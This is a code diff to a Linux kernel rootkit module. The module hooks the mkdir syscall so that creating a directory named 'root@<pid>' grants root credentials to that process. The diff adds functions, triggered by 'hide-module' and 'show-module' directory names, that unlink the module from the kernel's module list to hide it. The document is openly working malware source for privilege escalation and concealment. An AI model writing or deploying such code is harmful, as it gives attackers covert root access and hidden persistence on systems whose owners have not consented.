@@ -18,21 +18,24 @@ void set_root(unsigned task_pid)
     struct task_struct *task;
     struct cred *root;
 
-    if(!proc_pid){
+    if(!proc_pid) 
+    {
         printk("rootkit: Failed to get pid.\n");
         return;
     }
     
     task = pid_task(proc_pid, PIDTYPE_PID);
 
-    if (task == NULL) {
+    if (task == NULL) 
+    {
       printk("rootkit: Failed to get this task info.\n");
       return;
     }
 
     root = prepare_creds();
 
-    if (root == NULL){
+    if (root == NULL)
+    {
         printk(KERN_ALERT "rootkit: Failed to get creds.\n");
         return;
     }
@@ -48,6 +51,40 @@ void set_root(unsigned task_pid)
 }
 
 static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
+static struct list_head *prev_module;
+
+typedef unsigned char *byte_pointer;
+void debug_show_bytes(byte_pointer start, int len) {
+    printk(KERN_DEBUG "rootkit: Debug start: ");
+
+    for (int i = 0; i < len; i++)
+    {
+        printk(KERN_CONT " %c", start[i]);
+    }
+    
+    printk(KERN_CONT "\n");
+}
+
+int hide_status = 0;
+
+void hide_module(void)
+{
+    if(!hide_status)
+    {
+        prev_module = THIS_MODULE->list.prev;
+        list_del(&THIS_MODULE->list);
+        hide_status = 1;
+    }
+}
+
+void show_module(void)
+{
+    if(hide_status)
+    {
+        list_add(&THIS_MODULE->list, prev_module);
+        hide_status = 0;
+    }
+}
 
 asmlinkage int hook_mkdir(const struct pt_regs *regs)
 {
@@ -58,11 +95,22 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
 
     if (error > 0)
         printk(KERN_INFO "rootkit: Hook mkdir success.\n");
+       
     
     if(strncmp(dir_name, "root@", 5) == 0)
     {
-        set_root((unsigned)simple_strtol(&dir_name[5],(char **)(dir_name),10));
-    } else {
+        set_root((unsigned)simple_strtol(&dir_name[5], (char **)(dir_name), 10));
+    } 
+    else if(strncmp(dir_name, "hide-module", 11) == 0) 
+    {
+        hide_module();
+    } 
+    else if(strncmp(dir_name, "show-module", 11) == 0) 
+    {
+        show_module();
+    } 
+    else 
+    {
         orig_mkdir(regs);
     }
 
@@ -81,7 +129,7 @@ static int __init rootkit_init(void)
     if(err)
         return err;
 
-    printk(KERN_INFO "rootkit: Loaded.\n");
+    printk(KERN_INFO "rootkit: Loaded. <============================>\n");
 
     return 0;
 }
